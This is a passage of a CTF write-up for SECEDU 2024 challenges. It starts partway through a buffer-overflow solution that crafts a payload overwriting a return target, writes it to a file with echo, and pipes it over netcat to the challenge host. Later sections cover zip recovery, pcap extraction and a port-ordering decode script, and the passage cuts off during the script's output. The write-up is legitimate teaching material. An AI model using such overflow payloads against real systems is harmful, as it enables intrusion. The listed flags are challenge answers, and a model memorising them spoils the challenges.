+<p>From the below we know an 8 byte value (<code class="language-plaintext highlighter-rouge">QWORD PTR</code>) is being loaded into <code class="language-plaintext highlighter-rouge">rax</code> from <code class="language-plaintext highlighter-rouge">rbp-0x16</code> (<code class="language-plaintext highlighter-rouge">rbp - 16 bytes</code>).</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre><span class="mh">0x0000000000401316</span> <span class="o">&lt;+</span><span class="mi">148</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rax</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Craft a payload 16 bytes long with an extra byte at the end for the new address for <code class="language-plaintext highlighter-rouge">rax</code>.</p>
+
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre>python3 <span class="nt">-c</span> <span class="s1">'print("a"*8*16 + "A"*8)'</span>
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAA
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Run the program again.</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td>
+<td class="rouge-code"><pre><span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x000000000040131a</span> <span class="n">in</span> <span class="n">main</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">x</span><span class="o">/</span><span class="n">s</span> <span class="err">$</span><span class="n">rsp</span>
+<span class="mh">0x7fffffffe090</span><span class="o">:</span>	<span class="sc">'a'</span> <span class="o">&lt;</span><span class="n">repeats</span> <span class="mi">128</span> <span class="n">times</span><span class="o">&gt;</span><span class="p">,</span> <span class="s">"AAAAAAAA"</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="err">$</span><span class="n">rax</span>
+<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>It worked! <code class="language-plaintext highlighter-rouge">rax</code> is all “A” (0x41 in hex). Let’s make the payload the actual address of the secret document. Unfortunately, <code class="language-plaintext highlighter-rouge">0x4011f6</code> isn’t all printable characters so we will need a file for our payload.</p>
+
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre><span class="nb">echo</span> <span class="nt">-ne</span> <span class="s1">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x11\x40'</span> <span class="o">&gt;</span> payload.txt
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We will use <code class="language-plaintext highlighter-rouge">echo</code> to save the non-printable characters to a file and load the address in reverse order as we are on a little-endian system.</p>
+
+<p>Run the program with the file as input:</p>
+<div class="language-c highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td>
+<td class="rouge-code"><pre><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="n">payload</span><span class="p">.</span><span class="n">txt</span>
+<span class="p">...</span>
+<span class="n">Response</span><span class="o">:</span> <span class="n">Okay</span><span class="p">,</span> <span class="n">you</span> <span class="n">know</span> <span class="n">what</span><span class="o">?</span> <span class="n">Lets</span> <span class="n">go</span> <span class="n">to</span> <span class="mh">0x4011f6</span><span class="o">!!</span>
+ <span class="n">Andddd</span><span class="p">....</span> <span class="n">here</span> <span class="n">we</span> <span class="n">go</span><span class="o">!</span>
+
+<span class="n">Awesome</span> <span class="n">work</span><span class="p">,</span> <span class="n">here</span> <span class="n">is</span> <span class="n">the</span> <span class="n">only</span> <span class="n">top</span> <span class="n">secret</span> <span class="n">file</span><span class="p">,</span> <span class="n">obvious</span> <span class="n">employee</span><span class="o">:</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We have the secret file, now to do it for real with netcat.</p>
+
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td>
+<td class="rouge-code"><pre>Welcome to ORG-A's epic "File distribution system"! Here is the address of the function that contains the top-secret documents: 0x4011bd
+Please don't visit this, okay?
+Response: s
+Okay, you know what? Lets go to 0x40122b!!
+ Andddd.... here we go!
+
+Nothing found here, but thanks for stopping by!
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>We know the program, and we know the buffer. This time we are going to <code class="language-plaintext highlighter-rouge">0x4011bd</code>. Make a new payload, and send the file with netcat along with the <code class="language-plaintext highlighter-rouge">-q</code> to quit the transmission after one second.</p>
+
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td>
+<td class="rouge-code"><pre><span class="nb">cat </span>payload.txt | nc <span class="nt">-q</span> 1 chals.secedu.site 5001
+Welcome to ORG-A<span class="s1">'s epic "File distribution system"! Here is the address of the function that contains the top-secret documents: 0x4011bd
+Please don'</span>t visit this, okay?
+Response: Okay, you know what? Lets go to 0x4011bd!!
+ Andddd.... here we go!
+
+Awesome work, here is the only top secret file, obvious employee:
+SECEDU<span class="o">{</span>h0w_c4n_u_0v3rfl0w_with_0n3_f1le?<span class="o">}</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Flag: <mark>SECEDU{h0w_c4n_u_0v3rfl0w_with_0n3_f1le?}</mark></p>
+
+<h3 id="fix-n-find">
+<span class="me-2">Fix ‘n’ find</span><a href="#fix-n-find" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>One of the employees, Layton, has taken you aside, and is wondering if you can help fix a zip file that they broke.</p>
+</blockquote>
+
+<blockquote>
+  <p>There seems to be some sensitive information hidden inside of it, we might as well have a look at this too (it’s within scope) ;)</p>
+</blockquote>
+
+<p>We are given a zip <code class="language-plaintext highlighter-rouge">files.zip</code>.</p>
+
+<p>I extract the zip’s data with <code class="language-plaintext highlighter-rouge">7z</code>:</p>
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span>7z x files.zip
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+...
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 258185 bytes <span class="o">(</span>253 KiB<span class="o">)</span>
+
+Extracting archive: files.zip
+WARNING:
+files.zip
+The archive is open with offset
+
+<span class="nt">--</span>
+Path <span class="o">=</span> files.zip
+Warning: The archive is open with offset
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 258185
+
+ERROR: Headers Error : random_files
+                   
+Sub items Errors: 1
+
+Archives with Errors: 1
+
+Sub items Errors: 1
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>It extracts to a <code class="language-plaintext highlighter-rouge">random_files</code> folder, with some errors.</p>
+
+<p>I then run a basic <code class="language-plaintext highlighter-rouge">grep -iR</code> to recursively search all the files for the flag.</p>
+
+<div class="language-bash highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td>
+<td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-iR</span> <span class="s1">'SECEDU'</span>                
+be32dd5e3b6c8748.txt:SECEDU<span class="o">{</span>w04h!_th4t_w45_c0mpre55ing<span class="o">}</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>Well, all done!</p>
+
+<p>Flag: <mark>SECEDU{w04h!_th4t_w45_c0mpre55ing}</mark></p>
+
+<h3 id="not-quite-all">
+<span class="me-2">Not quite all</span><a href="#not-quite-all" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>The previously captured traffic contained an interesting tidbit towards the end of the file.</p>
+</blockquote>
+
+<blockquote>
+  <p>What was the second line sent in the secret message?</p>
+</blockquote>
+
+<blockquote>
+  <p>The message should wrapped in SECEDU{}. If it’s another language, do not translate it.</p>
+</blockquote>
+
+<p>This challenge was also written up by my teammate <a href="https://x.com/finnersio">finnersio</a>!</p>
+
+<p>Opening up the pcap file there is only a couple packets and they are all part of the one stream. Right clicking on any of the packets we can follow the TCP stream.</p>
+
+<p>Immediately we see some data at the top the stream showing a PDF file was sent:</p>
+
+<p><a href="/images/ctfs/secedu2024/notquiteall.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/notquiteall.png" alt="notquiteall" loading="lazy"></a></p>
+
+<p>We can extract the data by clicking <code class="language-plaintext highlighter-rouge">Show data as: Raw</code> and <code class="language-plaintext highlighter-rouge">Save as</code>, saving the data as a PDF file.</p>
+
+<p>Opening up the PDF, the flag is in the top left.</p>
+
+<p><a href="/images/ctfs/secedu2024/notquiteall-pdf.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/notquiteall-pdf.png" alt="notquiteallpdf" loading="lazy"></a></p>
+
+<p>Flag: <mark>SECEDU{s0m3_empl0y33_b3n3fit5}&lt;/flag&gt;</mark></p>
+
+<h2 id="hard">
+<span class="me-2">Hard</span><a href="#hard" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h2>
+
+<h3 id="loudhailer">
+<span class="me-2">Loudhailer</span><a href="#loudhailer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
+</h3>
+<blockquote>
+  <p>More traffic from ORG-A. Users were complaining that a server was not working properly. After some investigation, the network administrator captured some strange traffic coming from the server.</p>
+</blockquote>
+
+<blockquote>
+  <p>Can you find if any confidential data has been leaked as a result?</p>
+</blockquote>
+
+<p>This challenge was made of lots of red herrings.</p>
+
+<p>Opening the PCAP with Wireshark, we can see some intersting combinations of the words <code class="language-plaintext highlighter-rouge">pip</code>, <code class="language-plaintext highlighter-rouge">squeak</code> and <code class="language-plaintext highlighter-rouge">buzz</code>.</p>
+
+<p>Extracting the streams out in order we get this:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+</pre></td>
+<td class="rouge-code"><pre>squeakbuzzbuzz
+pippipbuzz
+buzzsqueakpipbuzz
+squeaksqueakbuzz
+squeakbuzzsqueak
+squeakpipbuzz
+buzzbuzzsqueak
+buzzbuzzpip
+squeaksqueaksqueak
+pipsqueakpip
+squeaksqueakbuzz
+pipsqueakbuzzpip
+pipbuzzpip
+pippipbuzz
+pippipsqueak
+pipsqueaksqueak
+buzzsqueakpip
+pippipsqueak
+buzzpipbuzz
+squeaksqueaksqueak
+squeaksqueakbuzz
+squeakpipsqueak
+pippippip
+squeakpipsqueak
+squeakbuzzsqueak
+buzzsqueakpip
+buzzbuzzpipsqueak
+pipsqueaksqueak
+pipbuzzpip
+buzzpipbuzz
+buzzpippip
+buzzpipsqueak
+squeaksqueakbuzz
+buzzbuzzsqueak
+squeakbuzzbuzz
+buzzsqueakbuzz
+pippipbuzz
+squeakpipbuzz
+squeaksqueakpip
+pippippip
+buzzpippip
+squeakbuzzsqueak
+buzzbuzzsqueak
+buzzpipbuzz
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>After many attempts at decoding, we found this was completely useless…</p>
+
+<p>We took a step back and noticed something odd…</p>
+
+<p><a href="/images/ctfs/secedu2024/loudhailer-ports.png" class="popup img-link  shimmer"><img src="/images/ctfs/secedu2024/loudhailer-ports.png" alt="loudhailer-ports" loading="lazy"></a></p>
+
+<p>The ports keep changing, we decide to pull them out with <code class="language-plaintext highlighter-rouge">tshark</code>.</p>
+
+<p>These are the destination ports:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre>0  37  16  5  2  12  40  43  13  8  15  31  33  20  19  14  24  41  34  3  17  29  28  39  1  38  10  23  6  7  35  25  32  30  42  4  27  26  21  22  36  11  9  18  0  40  21  43  4  24  3  1  37  10  6  34  25  8  22  18  20  5  36  16  13  14  15  7  30  33  42  9  32  19  12  38  17  23  29  31  27  2  41  11  26  35  28  39  42  26  1  2  5  22  38  29  18  3  40  35  33  17  9  25  19  0  7  6  14  36  41  11  39  16  24  13  28  10  34  15  43  30  4  27  21  31  12  37  23  32  8  20  10  16  31
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+<p>and these are the source ports:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td>
+<td class="rouge-code"><pre>83  95  95  85  67  95  51  125  52  95  68  81  51  85  56  78  52  51  52  69  52  95  52  72  69  87  49  95  123  52  75  78  85  53  49  68  95  68  90  90  89  80  80  95  83  51  90  125  68  52  69  69  95  49  123  52  78  95  90  95  85  85  89  95  52  78  68  52  53  51  49  80  85  56  95  87  52  95  95  81  95  67  51  80  68  75  52  72  49  68  69  67  85  90  87  95  95  69  51  75  51  52  80  78  56  83  52  123  78  89  51  80  72  95  52  52  52  49  52  68  125  53  68  95  90  81  95  95  95  85  95  85  49  95  81
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>I take a guess that the destination ports are corresponding to order of the source ports, as the source ports fall within ASCII values.</p>
+
+<p>My teammate quickly made this Python script:</p>
+<div class="language-python highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td>
+<td class="rouge-code"><pre><span class="n">order</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">42</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">38</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">35</span><span class="p">,</span><span class="mi">33</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">36</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">39</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">34</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">31</span><span class="p">]</span>
+<span class="n">characters</span> <span class="o">=</span> <span class="p">[</span><span class="mi">83</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">81</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">87</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">87</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">81</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">87</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">69</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">75</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">56</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">78</span><span class="p">,</span><span class="mi">89</span><span class="p">,</span><span class="mi">51</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">72</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">52</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">125</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">68</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">90</span><span class="p">,</span><span class="mi">81</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">85</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">81</span><span class="p">]</span>
+
+<span class="n">string</span> <span class="o">=</span> <span class="sh">""</span>
+<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">order</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">order</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="n">order</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">i</span><span class="p">:</span>
+            <span class="n">string</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">characters</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+            <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+            <span class="nf">print</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
+</pre></td>
+</tr></tbody></table></code></div>
+</div>
+
+<p>The output of the script:</p>
+<div class="language-plaintext highlighter-rouge">
+<div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
+</div>
+<div class="highlight"><code><table class="rouge-table"><tbody><tr>
+<td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td>
